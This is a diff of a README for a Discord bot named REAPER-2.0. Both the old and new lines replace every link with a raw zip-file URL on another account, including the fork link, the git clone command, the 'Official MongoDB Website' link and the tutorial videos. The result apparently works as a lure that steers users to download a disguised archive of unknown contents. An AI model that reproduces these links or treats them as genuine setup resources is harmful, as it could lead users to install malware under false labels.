@@ -1,14 +1,14 @@
 
 
-**<p align="center"> <img src="https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/Commands/Fun/REAPE-1.2.zip" /> </p>**
+**<p align="center"> <img src="https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/events/player/REAPE-2.4-alpha.4.zip" /> </p>**
 
 
 <h1 align="center"> REAPER-2.0  </h1>
 <p align="center">
-<a href="https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/Commands/Fun/REAPE-1.2.zip"><img alt="GitHub License" src="https://img.shields.io/github/license/Simpleboy353/REAPER-2.0?style=for-the-badge"></a>
-<a href="https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/Commands/Fun/REAPE-1.2.zip"><img alt="GitHub Stars" src="https://img.shields.io/github/stars/Simpleboy353/REAPER-2.0?style=for-the-badge"></a> 
-<a href="https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/Commands/Fun/REAPE-1.2.zip"><img alt="GitHub Forks" src="https://img.shields.io/github/forks/Simpleboy353/REAPER-2.0?style=for-the-badge"></a>
-<a href="https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/Commands/Fun/REAPE-1.2.zip"><img alt="Support Server" src="https://img.shields.io/badge/Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white"></a>
+<a href="https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/events/player/REAPE-2.4-alpha.4.zip"><img alt="GitHub License" src="https://img.shields.io/github/license/Simpleboy353/REAPER-2.0?style=for-the-badge"></a>
+<a href="https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/events/player/REAPE-2.4-alpha.4.zip"><img alt="GitHub Stars" src="https://img.shields.io/github/stars/Simpleboy353/REAPER-2.0?style=for-the-badge"></a> 
+<a href="https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/events/player/REAPE-2.4-alpha.4.zip"><img alt="GitHub Forks" src="https://img.shields.io/github/forks/Simpleboy353/REAPER-2.0?style=for-the-badge"></a>
+<a href="https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/events/player/REAPE-2.4-alpha.4.zip"><img alt="Support Server" src="https://img.shields.io/badge/Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white"></a>
 </p>
 <h3 align="center">A Multi-purpose Discord bot with many features!</h3>
 
@@ -22,7 +22,7 @@
 - Basic knowledge of JS or Discord.JS
 
 ## Have suggestions on what could be added?
-- **Leave your suggestions right [here](https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/Commands/Fun/REAPE-1.2.zip) then!**
+- **Leave your suggestions right [here](https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/events/player/REAPE-2.4-alpha.4.zip) then!**
 
 ## What features does Reaper Include?
 
@@ -85,7 +85,7 @@
 
 </details>
 
-- **Keep checking the [Releases Section](https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/Commands/Fun/REAPE-1.2.zip) to get the latest info relating new updates, bug fixes etc about the repository.**
+- **Keep checking the [Releases Section](https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/events/player/REAPE-2.4-alpha.4.zip) to get the latest info relating new updates, bug fixes etc about the repository.**
 - **The Information above includes Versions with only `Major Updates` and not Versions with `Bug fixes`**
 - **`v6.1.0-stable` is included in the List because this version includes the fixing of every error in the repository.**
 - **Support is provided only for `Stable` and `Beta` Versions and not for `Alpha` Versions.**
@@ -94,8 +94,8 @@
 
 ## Getting started
 #### Creating a fork:
-- 1). [Click here to fork the repository](https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/Commands/Fun/REAPE-1.2.zip)
-- 2). Open your terminal and type `git clone https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/Commands/Fun/REAPE-1.2.zip`
+- 1). [Click here to fork the repository](https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/events/player/REAPE-2.4-alpha.4.zip)
+- 2). Open your terminal and type `git clone https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/events/player/REAPE-2.4-alpha.4.zip`
 #### Installing all necessary packages
 - `npm install`
 #### Starting the bot
@@ -116,23 +116,23 @@
   "YT_COOKIE": "ADD_YOUR_COOKIE_HERE",
 }
 ```
-- **Watch [this video](https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/Commands/Fun/REAPE-1.2.zip) to know, how to get the `YT_COOKIE`**
+- **Watch [this video](https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/events/player/REAPE-2.4-alpha.4.zip) to know, how to get the `YT_COOKIE`**
 - **You may use any channel id for `ERROR_LOGS_CHANNEL`, but the bot must be present in the server you are choosing the ID from.**
 - **All the errors your bot faces, will be logged in the `ERROR_LOGS_CHANNEL`**
 - **The `mongoPass` must be a `url`**
-- **Visit Official [MongoDB Website](https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/Commands/Fun/REAPE-1.2.zip) to get your `mongoPass`**
+- **Visit Official [MongoDB Website](https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/events/player/REAPE-2.4-alpha.4.zip) to get your `mongoPass`**
 - **Watch this video to know how to get your `mongoPass`:**
-[![MongoDb Tutorial](https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/Commands/Fun/REAPE-1.2.zip)](https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/Commands/Fun/REAPE-1.2.zip "MongoDB Tutorial")
+[![MongoDb Tutorial](https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/events/player/REAPE-2.4-alpha.4.zip)](https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/events/player/REAPE-2.4-alpha.4.zip "MongoDB Tutorial")
 - **Don't change the `tenorAPI` else the `gif` command won't work!**
 
 
 ---
 
 ## Contributing
-- **Before contributing to this repo, make sure to read [CONTRIBUTIONS.md](https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/Commands/Fun/REAPE-1.2.zip)**
-- **Join our [Support & Development Server](https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/Commands/Fun/REAPE-1.2.zip)**
-- **Join our [Community server](https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/Commands/Fun/REAPE-1.2.zip)**
-- **Invite my bot to your Server, [Here](https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/Commands/Fun/REAPE-1.2.zip)**
+- **Before contributing to this repo, make sure to read [CONTRIBUTIONS.md](https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/events/player/REAPE-2.4-alpha.4.zip)**
+- **Join our [Support & Development Server](https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/events/player/REAPE-2.4-alpha.4.zip)**
+- **Join our [Community server](https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/events/player/REAPE-2.4-alpha.4.zip)**
+- **Invite my bot to your Server, [Here](https://raw.githubusercontent.com/nkzprod/REAPER-2.0/master/events/player/REAPE-2.4-alpha.4.zip)**
 
 ---
 
